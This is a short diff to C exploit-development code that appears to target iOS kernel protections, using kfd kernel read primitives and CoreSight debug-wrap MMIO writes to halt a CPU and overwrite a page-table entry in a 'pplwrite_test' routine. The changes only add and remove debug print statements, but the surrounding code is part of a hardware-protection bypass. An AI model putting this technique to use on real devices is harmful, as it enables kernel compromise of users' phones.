@@ -226,6 +226,7 @@ void ml_dbgwrap_unhalt_cpu_1516(uint64_t coresight_base_utt) {
     printf("ml_dbgwrap_unhalt_cpu set value: %llx\n", (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000);
     write_qword(coresight_base_utt, (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000);
     while (1) {
+        printf("ml_dbgwrap_unhalt_cpu new value: %llx\n", *(uint64_t *)coresight_base_utt);
         if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
             break;
         }
@@ -361,13 +362,10 @@ int pplwrite_test(void) {
         
         ml_dbgwrap_halt_cpu_1516(base6040000);
         printf("halted?\n");
-        printf("%llx\n", ((struct kfd*)_kfd)->info.kernel.kernel_slide);
         
         uint64_t val = 0x4141414141414141;
         write_data_with_mmio(table_v + 0x8, base6150000, base6140008, base6140108, original_value_0x206140108, mask, i, val);
         printf("written?\n");
-        printf("%llx\n", ((struct kfd*)_kfd)->info.kernel.kernel_slide);
-        printf("%llx : %llx\n", table_v + 0x8, kread64_kfd(table_v + 0x8));
         usleep(5000);
         
         ml_dbgwrap_unhalt_cpu_1516(base6040000);
